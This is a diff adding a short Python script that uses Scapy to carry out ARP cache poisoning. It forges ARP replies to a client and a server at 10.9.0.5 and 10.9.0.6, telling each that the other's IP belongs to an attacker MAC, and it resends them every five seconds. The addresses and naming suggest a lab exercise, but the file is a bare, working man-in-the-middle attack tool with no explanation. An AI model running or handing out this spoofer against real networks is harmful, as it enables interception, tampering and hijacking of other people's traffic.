@@ -1,0 +1,36 @@
+#!/usr/bin/python
+from scapy.all import *
+from threading import Timer
+def arpspoof():
+        VM_CLIENT_IP="10.9.0.5"
+        VM_CLIENT_MAC="02:42:0a:09:00:05"
+        VM_SERVER_IP="10.9.0.6"
+        VM_SERVER_MAC="02:42:0a:09:00:06"
+        VM_ATTACKER_IP="10.9.0.105"
+        VM_ATTACKER_MAC="02:42:0a:09:00:69"
+
+        E=Ether()
+        E.dst=VM_CLIENT_MAC
+
+        A=ARP()
+        A.psrc=VM_SERVER_IP     
+        A.hwsrc=VM_ATTACKER_MAC
+        A.op=2
+        frame=E/A
+        sendp(frame)
+
+        E=Ether()
+        E.dst=VM_SERVER_MAC
+
+        A=ARP()
+        A.psrc=VM_CLIENT_IP
+        A.hwsrc=VM_ATTACKER_MAC
+        A.op=2
+        frame=E/A
+        sendp(frame)
+        Timer(5,arpspoof).start()
+arpspoof()
+
+
+
+
